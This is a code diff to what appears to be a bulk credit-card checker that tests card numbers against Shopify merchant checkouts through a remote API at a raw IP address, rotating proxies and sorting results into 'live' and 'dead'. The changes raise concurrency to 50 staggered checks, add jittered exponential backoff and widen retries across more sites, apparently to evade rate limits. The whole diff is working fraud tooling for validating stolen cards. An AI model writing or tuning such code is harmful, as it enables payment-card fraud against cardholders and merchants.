@@ -6190,7 +6190,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
         const SHOPIFY_API_URL_MTXT = "http://108.165.12.183:8081/";
         const MTXT_DEBUG_CHAT = "-1003848532661";
-        const MTXT_UNKNOWN_RETRIES = 3;
+        const MTXT_MAX_RETRIES = 5;
         const mtxtStartTime = Date.now();
 
         const mtxtBadResponses = ["Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available", "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"'];
@@ -6283,12 +6283,14 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           } catch (e) { clearTimeout(timeout); const msg = e instanceof Error ? e.message : 'Error'; return { status: 'unknown', message: msg.includes('abort') ? 'Timeout' : msg, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' }; }
         };
 
-        // With retry
+        // With retry - exponential backoff like web Shopify gateway
         const mtxtCallWithRetry = async (cardCC: string, siteUrl: string, proxy: string) => {
           let result = await mtxtCallOnce(cardCC, siteUrl, proxy);
           if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
-          for (let retry = 1; retry <= MTXT_UNKNOWN_RETRIES; retry++) {
-            await new Promise(r => setTimeout(r, 800 * retry));
+          for (let retry = 1; retry <= MTXT_MAX_RETRIES; retry++) {
+            const baseDelay = 900;
+            const backoffMs = Math.min(12000, baseDelay * (2 ** (retry - 1)) + Math.floor(Math.random() * 500));
+            await new Promise(r => setTimeout(r, backoffMs));
             result = await mtxtCallOnce(cardCC, siteUrl, proxy);
             if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
           }
@@ -6299,7 +6301,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const mtxtCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
           const shuffledProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
           if (shuffledProxies.length === 0) return { status: 'unknown', response: 'No proxies', price: '$0.00' };
-          const maxSites = Math.min(2, mtxtAvailableSites.length);
+          const maxSites = Math.min(5, mtxtAvailableSites.length);
           for (let si = 0; si < maxSites; si++) {
             const site = mtxtAvailableSites[si % mtxtAvailableSites.length];
             for (const proxy of shuffledProxies) {
@@ -6317,7 +6319,8 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
               if (result.status === 'live' || result.status === 'dead') {
                 return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
               }
-              return { status: 'unknown', response: result.response || result.message || 'Unknown', price: result.price > 0 ? result.priceStr : '$0.00' };
+              // On unknown, try next site instead of returning immediately
+              break;
             }
           }
           return { status: 'unknown', response: 'All attempts failed', price: '$0.00' };
@@ -6380,9 +6383,9 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           return { msg, buttons };
         };
 
-        // Auto-determine thread count
-        const mtxtActiveProxies = mtxtProxies.filter((p: any) => !mtxtFailedProxyIds.includes(p.id)).length;
-        const mtxtThreads = Math.max(3, Math.min(4, Math.min(mtxtActiveProxies, mtxtCards.length)));
+        // 50-thread concurrency with staggered launches like web Shopify gateway
+        const MTXT_CONCURRENCY = 50;
+        const MTXT_STAGGER_MS = 180;
 
         // Show initial processing message with animation
         const initData = buildMtxtMessageAndButtons(0, mtxtCards.length, '0.00', false);
@@ -6468,18 +6471,41 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           } catch {}
         };
 
-        // Process cards with auto threads
+        // Staggered 50-card session model (matching web Shopify gateway)
         const mtxtQueue = mtxtCards.map(c => c.trim()).filter(c => c);
         let mtxtQueueIdx = 0;
-        const mtxtWorker = async () => {
-          while (mtxtQueueIdx < mtxtQueue.length && !mtxtStopped) {
-            const idx = mtxtQueueIdx++;
-            await mtxtProcessCard(mtxtQueue[idx]);
+        const MIN_COMPLETE_BEFORE_NEXT = 49;
+
+        while (mtxtQueueIdx < mtxtQueue.length && !mtxtStopped) {
+          const batchEnd = Math.min(mtxtQueueIdx + MTXT_CONCURRENCY, mtxtQueue.length);
+          const batchCards = mtxtQueue.slice(mtxtQueueIdx, batchEnd);
+
+          let batchCompleted = 0;
+          await new Promise<void>((resolve) => {
+            const promises = batchCards.map(async (card, launchOrder) => {
+              if (mtxtStopped) return;
+              // Staggered launch delay like web (180ms + random jitter)
+              if (launchOrder > 0) {
+                const launchDelay = launchOrder * MTXT_STAGGER_MS + Math.floor(Math.random() * 120);
+                await new Promise(r => setTimeout(r, launchDelay));
+              }
+              if (mtxtStopped) return;
+
+              await mtxtProcessCard(card);
+              batchCompleted++;
+              if (batchCompleted >= Math.min(MIN_COMPLETE_BEFORE_NEXT, batchCards.length)) {
+                resolve();
+              }
+            });
+            Promise.all(promises).then(() => resolve());
+          });
+
+          mtxtQueueIdx = batchEnd;
+          // Small gap between sessions
+          if (mtxtQueueIdx < mtxtQueue.length && !mtxtStopped) {
+            await new Promise(r => setTimeout(r, 600));
           }
-        };
-        const mtxtWorkers: Promise<void>[] = [];
-        for (let t = 0; t < mtxtThreads; t++) { mtxtWorkers.push(mtxtWorker()); }
-        await Promise.all(mtxtWorkers);
+        }
 
         // Cleanup stop tracker
         await supabase.from("pending_bulk_checks").delete().eq("id", mtxtBulkId);
